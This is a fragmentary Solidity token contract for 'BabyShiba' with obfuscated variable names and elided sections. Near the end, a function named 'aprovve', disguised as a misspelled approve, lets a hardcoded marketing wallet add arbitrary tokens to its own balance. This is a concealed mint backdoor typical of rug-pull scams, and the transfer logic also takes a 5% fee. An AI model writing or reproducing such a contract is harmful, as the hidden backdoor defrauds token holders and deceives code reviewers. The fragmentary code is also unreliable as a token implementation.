...
contract Context {
 ...
 contract BabyShiba is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloKOLEZ;
    ...
    uint256 private cryfaleKOLEZ = 5;
    uint256 private _vebegoKOLEZ = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloKOLEZ[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletKOLEZ = 0x3C08dF4F05C54fd31A2703F2Abd5B41d47e14b50;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloKOLEZ[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloKOLEZ[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleKOLEZ / 100) / _vebegoKOLEZ;
        allons = allons -  (_fee * _vebegoKOLEZ);
        
        superfloKOLEZ[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaKOLEZ) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloKOLEZ[account];
        require(accountBalance >= gzillaKOLEZ, "BEP : Can't be done");
        unchecked {
            superfloKOLEZ[account] = accountBalance - gzillaKOLEZ;
        }
        _totalSupply -= gzillaKOLEZ;

        emit Transfer(account, address(0), gzillaKOLEZ);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloKOLEZ[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletKOLEZ, "ERC20: cannot permit dev address");
    }   
